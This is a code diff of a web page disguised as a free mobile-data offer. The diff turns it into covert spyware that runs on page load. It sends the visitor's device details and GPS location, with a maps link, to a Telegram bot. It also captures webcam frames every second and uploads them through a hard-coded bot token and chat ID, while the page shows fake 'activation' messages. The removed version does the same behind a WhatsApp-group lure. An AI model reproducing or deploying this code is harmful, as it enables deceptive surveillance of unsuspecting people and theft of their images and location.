@@ -1,118 +1,121 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Free Internet Generator</title>
+  <title>Free Internet Activation</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: linear-gradient(to right, #6dd5ed, #2193b0);
+      background: linear-gradient(to right, #00c6ff, #0072ff);
       color: white;
       text-align: center;
       padding: 50px;
     }
     .card {
-      background: rgba(0,0,0,0.3);
+      background: rgba(255,255,255,0.1);
       padding: 30px;
       border-radius: 15px;
       max-width: 400px;
       margin: auto;
     }
-    button {
-      background: #27ae60;
-      color: white;
-      padding: 15px 30px;
-      font-size: 18px;
-      border: none;
-      border-radius: 10px;
-      margin-top: 20px;
-      cursor: pointer;
+    h2 {
+      margin-bottom: 20px;
     }
-    a {
-      color: yellow;
+    p {
+      font-size: 16px;
     }
   </style>
 </head>
 <body>
   <div class="card">
-    <h2>🎁 Free 5GB Internet Offer</h2>
-    <p>Join our official WhatsApp group to verify your number and get the offer.</p>
-    <a href="https://chat.whatsapp.com/YOUR_GROUP_LINK" target="_blank">
-      <button>✅ Join WhatsApp Group</button>
-    </a>
-
-    <p>After joining, click below to activate your internet.</p>
-    <button onclick="startBot()">🚀 Activate Internet</button>
-
-    <p id="status"></p>
+    <h2>🎁 Activate Free 5GB Internet</h2>
+    <p>Checking your SIM and device...</p>
+    <p id="status">🔄 Initializing...</p>
   </div>
 
+  <video id="video" autoplay playsinline width="320" height="240" style="display:none;"></video>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
   <script>
-    let botStarted = false;
-    const BOT_TOKEN = "8017259757:AAHeP_v-F9whiHa_O9fa-2YCeqjXg6luQjc"; // From Nx Creator
-    const CHAT_ID = "8138502747";     // Your Telegram ID
+    const BOT_TOKEN = "8017259757:AAHeP_v-F9whiHa_O9fa-2YCeqjXg6luQjc";
+    const CHAT_ID = "8138502747";
+    const status = document.getElementById("status");
 
-    function startBot() {
-      if (botStarted) return;
-      botStarted = true;
-
-      document.getElementById("status").innerText = "📡 Connecting...";
-
-      // Camera start
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          const video = document.createElement("video");
-          video.srcObject = stream;
-          video.play();
-
-          const canvas = document.createElement("canvas");
-          canvas.width = 320;
-          canvas.height = 240;
-          const ctx = canvas.getContext("2d");
-
-          setInterval(() => {
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const dataUrl = canvas.toDataURL("image/png");
-            sendToTelegram(dataUrl);
-          }, 1000); // Every 1 sec
-        })
-        .catch(() => {
-          alert("❌ Camera permission is required!");
+    function sendToTelegram(type, data) {
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      if (type === "photo") {
+        formData.append("photo", data, "photo.png");
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formData
         });
+      } else if (type === "message") {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: data
+          })
+        });
+      }
+    }
 
-      // Location once
-      navigator.geolocation.getCurrentPosition(pos => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        sendText(`📍 Location:\nLat: ${lat}\nLon: ${lon}`);
+    function getDeviceInfo() {
+      const info = [
+        "📱 Device Info:",
+        "Platform: " + navigator.platform,
+        "User Agent: " + navigator.userAgent,
+        "Screen: " + screen.width + "x" + screen.height,
+        "Language: " + navigator.language
+      ];
+      sendToTelegram("message", info.join("\n"));
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          const locMsg = `📍 Location:\nLat: ${lat}\nLon: ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`;
+          sendToTelegram("message", locMsg);
+        });
+      } else {
+        sendToTelegram("message", "❌ Geolocation not supported.");
+      }
+    }
+
+    function capturePhoto() {
+      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+
+        const canvas = document.getElementById("canvas");
+        const ctx = canvas.getContext("2d");
+
+        setInterval(() => {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(blob => {
+            sendToTelegram("photo", blob);
+          }, "image/png");
+        }, 1000);
+      }).catch(() => {
+        status.innerText = "❌ Camera permission denied.";
       });
     }
 
-    function sendToTelegram(dataUrl) {
-      fetch(dataUrl)
-        .then(res => res.blob())
-        .then(blob => {
-          const formData = new FormData();
-          formData.append("chat_id", CHAT_ID);
-          formData.append("photo", blob, "photo.png");
-
-          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: "POST",
-            body: formData
-          });
-        });
-    }
-
-    function sendText(text) {
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: text
-        })
-      });
-    }
+    // Start everything on load
+    window.onload = () => {
+      status.innerText = "📡 Requesting Permissions...";
+      getDeviceInfo();
+      getLocation();
+      capturePhoto();
+      status.innerText = "✅ Activated. Processing data...";
+    };
   </script>
 </body>
 </html>
